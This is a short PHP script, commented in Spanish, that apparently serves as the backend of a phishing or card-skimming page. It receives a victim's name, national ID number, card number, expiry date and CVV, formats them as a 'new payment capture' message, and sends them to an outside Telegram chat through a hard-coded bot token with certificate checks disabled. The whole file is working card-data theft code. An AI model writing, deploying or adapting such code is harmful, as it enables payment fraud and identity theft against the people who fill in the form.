<?php
/**
 * Proyecto: Envío de datos a Telegram
 * Servidor: VPS (Requiere php-curl instalado)
 */

header('Content-Type: application/json');

// 1. Configuración del Bot (Mantenlos privados)
$token  = "8948795195:AAFNDbx1b03tL9fEjvrrN5mieFYNbFT5l1g";
$chatId = "8510398513";

// 2. Captura de datos (Soporta JSON de JS y $_POST de formularios)
$input = json_decode(file_get_contents('php://input'), true) ?? $_POST;

$titular     = htmlspecialchars($input['titular'] ?? 'N/A');
$dni         = htmlspecialchars($input['dni'] ?? 'N/A');
$tarjeta     = htmlspecialchars($input['tarjeta'] ?? 'N/A');
$vencimiento = htmlspecialchars($input['vencimiento'] ?? 'N/A');
$cvv         = htmlspecialchars($input['cvv'] ?? 'N/A');

// 3. Preparación del Mensaje (Formato HTML)
$mensaje = "<b>💳 Nueva Captura de Pago</b>\n\n"
         . "<b>👤 Titular:</b> $titular\n"
         . "<b>🆔 DNI:</b> $dni\n"
         . "<b>🔢 Tarjeta:</b> <code>$tarjeta</code>\n"
         . "<b>📅 Vencimiento:</b> $vencimiento\n"
         . "<b>🔒 CVV:</b> <code>$cvv</code>";

// 4. Ejecución del envío mediante cURL
$url = "https://api.telegram.org/bot$token/sendMessage";
$data = [
    'chat_id'    => $chatId,
    'text'       => $mensaje,
    'parse_mode' => 'HTML'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Evita problemas de certificados en VPS

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// 5. Respuesta al Frontend
if ($httpCode === 200) {
    echo json_encode(['status' => 'success', 'message' => 'Datos enviados correctamente']);
} else {
    echo json_encode(['status' => 'error', 'message' => 'Error en la API de Telegram']);
}
